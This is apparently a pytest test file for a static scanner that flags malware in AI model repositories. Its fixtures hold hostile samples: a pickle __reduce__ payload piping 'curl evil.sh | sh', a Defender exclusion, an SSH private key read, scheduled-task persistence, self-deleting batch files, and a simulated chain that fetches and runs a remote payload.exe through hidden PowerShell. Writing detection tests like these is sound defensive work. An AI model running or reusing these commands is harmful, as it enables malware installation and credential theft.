import pytest
from app.scanner import StaticScanner, calculate_trust_score


scanner = StaticScanner()


def test_detects_base64_decode():
    files = {"loader.py": "import base64\ndata = base64.b64decode('aHR0cHM6Ly9ldmlsLmNvbQ==')"}
    matches = scanner.scan_files(files)
    names = [m.pattern_name for m in matches]
    assert "base64_decode" in names


def test_detects_ssl_disabled():
    files = {"loader.py": "import requests\nresp = requests.get(url, verify=False)"}
    matches = scanner.scan_files(files)
    names = [m.pattern_name for m in matches]
    assert "ssl_verification_disabled" in names


def test_detects_defender_exclusion():
    files = {"start.bat": "powershell -Command Add-MpPreference -ExclusionPath C:\\Users\\evil"}
    matches = scanner.scan_files(files)
    names = [m.pattern_name for m in matches]
    assert "defender_exclusion" in names


def test_detects_powershell_from_python():
    files = {"setup.py": "import subprocess\nsubprocess.run(['powershell', '-Command', cmd])"}
    matches = scanner.scan_files(files)
    names = [m.pattern_name for m in matches]
    assert "powershell_from_python" in names


def test_detects_self_deletion():
    files = {"run.bat": "start payload.exe\ndel /f %~f0"}
    matches = scanner.scan_files(files)
    names = [m.pattern_name for m in matches]
    assert "self_deletion" in names


def test_detects_bat_file_presence():
    files = {"start.bat": "@echo off\necho hello"}
    matches = scanner.scan_files(files)
    names = [m.pattern_name for m in matches]
    assert "suspicious_bat_in_ai_repo" in names


def test_detects_data_exfiltration():
    files = {"steal.py": "with open(os.path.expanduser('~/.ssh/id_rsa')) as f:\n    data = f.read()"}
    matches = scanner.scan_files(files)
    names = [m.pattern_name for m in matches]
    assert "data_exfiltration" in names


def test_detects_persistence():
    files = {"install.bat": "schtasks /create /tn MyTask /tr payload.exe /sc onlogon"}
    matches = scanner.scan_files(files)
    names = [m.pattern_name for m in matches]
    assert "persistence_mechanism" in names


def test_clean_file_no_matches():
    files = {"model.py": "import torch\nmodel = torch.nn.Linear(10, 2)\nprint(model)"}
    matches = scanner.scan_files(files)
    assert len(matches) == 0


# ── False positives ───────────────────────────────────────────────────────────
#
# Every case below was a real misfire found by scanning well-known repos.
# A scanner that cries wolf on `requests` teaches people to ignore it.

def test_ordinary_install_script_is_not_dangerous():
    """systemctl/sudo are how software gets installed, not evidence of malware."""
    files = {"deploy.sh": "#!/bin/sh\nsudo -S apt-get install -y nginx\nsystemctl enable myapp\n"}
    matches = scanner.scan_files(files)
    score = calculate_trust_score(matches)

    assert score >= 40, f"legit deploy script scored {score}"
    assert not any(m.malware_grade for m in matches)
    assert "privilege_escalation" not in [m.pattern_name for m in matches]


def test_reduce_definition_is_not_a_finding():
    """Defining __reduce__ is how a class becomes picklable — requests does it."""
    files = {"exceptions.py": (
        "class MyError(Exception):\n"
        "    def __reduce__(self):\n"
        "        return (MyError, (self.msg,))\n"
    )}
    assert scanner.scan_files(files) == []


def test_reduce_returning_os_system_is_a_finding():
    """The exploit shape, not the idiom, is what we care about."""
    files = {"payload.py": (
        "class Exploit:\n"
        "    def __reduce__(self):\n"
        "        return (os.system, ('curl evil.sh | sh',))\n"
    )}
    matches = scanner.scan_files(files)
    assert "malicious_reduce_payload" in [m.pattern_name for m in matches]
    assert calculate_trust_score(matches) == 15


def test_trust_remote_code_in_docs_is_informational():
    """Nearly every HF model card documents its own trust_remote_code usage."""
    docs = scanner.scan_files({"README.md": "model = AutoModel.from_pretrained('o/m', trust_remote_code=True)"})
    code = scanner.scan_files({"load.py": "model = AutoModel.from_pretrained('o/m', trust_remote_code=True)"})

    assert [m.pattern_name for m in docs] == ["trust_remote_code_documented"]
    assert calculate_trust_score(docs) >= 70, "a model card should not be 'suspicious'"

    assert [m.pattern_name for m in code] == ["trust_remote_code_enabled"]
    assert calculate_trust_score(code) < calculate_trust_score(docs)


def test_passing_mention_of_vmware_is_not_evasion():
    files = {"utils.py": "# Tested on VMware Fusion and VirtualBox\n"}
    assert "vm_detection" not in [m.pattern_name for m in scanner.scan_files(files)]


def test_actual_vm_check_is_still_evasion():
    files = {"check.py": "if 'VMware' in platform.uname().version:\n    sys.exit(0)\n"}
    assert "vm_detection" in [m.pattern_name for m in scanner.scan_files(files)]


def test_informational_findings_do_not_stack_into_dangerous():
    """Four low-severity signals are not equivalent to one Defender exclusion."""
    files = {
        "deploy.sh": "sudo -S apt-get install -y nginx\nsystemctl enable app\n",
        "train.py": "import torch\nckpt = torch.load('m.pt')\n",
        "README.md": "Load with trust_remote_code=True\n",
    }
    score = calculate_trust_score(scanner.scan_files(files))
    assert score >= 40, f"stacked informational findings scored {score}"


# ── Instant-dangerous rule ────────────────────────────────────────────────────

def test_only_malware_grade_findings_short_circuit():
    defender = scanner.scan_files({"go.bat": "Add-MpPreference -ExclusionPath C:\\"})
    cron = scanner.scan_files({"go.sh": "systemctl enable app\n"})

    assert calculate_trust_score(defender) == 15
    assert calculate_trust_score(cron) > 15


def test_score_dangerous_with_critical_findings():
    files = {
        "loader.py": "import base64\neval(base64.b64decode('cGF5bG9hZA=='))",
        "start.bat": "Add-MpPreference -ExclusionPath C:\\Windows",
    }
    matches = scanner.scan_files(files)
    score = calculate_trust_score(matches)
    assert score < 40  # should be dangerous


def test_one_finding_per_pattern_per_file():
    """Three ways of disabling SSL in one file is one finding, not three."""
    files = {"net.py": (
        "import ssl, urllib3, requests\n"
        "ctx = ssl._create_unverified_context()\n"
        "urllib3.disable_warnings()\n"
        "r = requests.get(u, verify=False)\n"
    )}
    matches = scanner.scan_files(files)
    ssl_hits = [m for m in matches if m.pattern_name == "ssl_verification_disabled"]
    assert len(ssl_hits) == 1
    assert ssl_hits[0].line_number == 2  # earliest occurrence, deterministically


def test_score_clean_repo():
    matches = []
    score = calculate_trust_score(matches)
    assert score == 100


def test_full_attack_chain_detected():
    """Simulates the exact OpenAI Hugging Face attack file patterns."""
    files = {
        "loader.py": """
import base64, requests, ssl
ssl._create_default_https_context = ssl._create_unverified_context
url = base64.b64decode('aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9zZWNyZXQ=').decode()
cmd = requests.get(url).json()['cmd']
import subprocess
subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', cmd])
""",
        "start.bat": """
@echo off
powershell -Command "Add-MpPreference -ExclusionPath C:\\Users\\Public"
curl -o payload.exe http://api.eth-fastscan.org/sefirah.exe
start /b payload.exe
del /f %~f0
""",
    }
    matches = scanner.scan_files(files)
    score = calculate_trust_score(matches)
    categories = {m.category for m in matches}

    assert score < 20, f"Expected score < 20, got {score}"
    assert "obfuscation" in categories
    assert "network" in categories
    assert "system_exec" in categories
    assert len(matches) >= 5
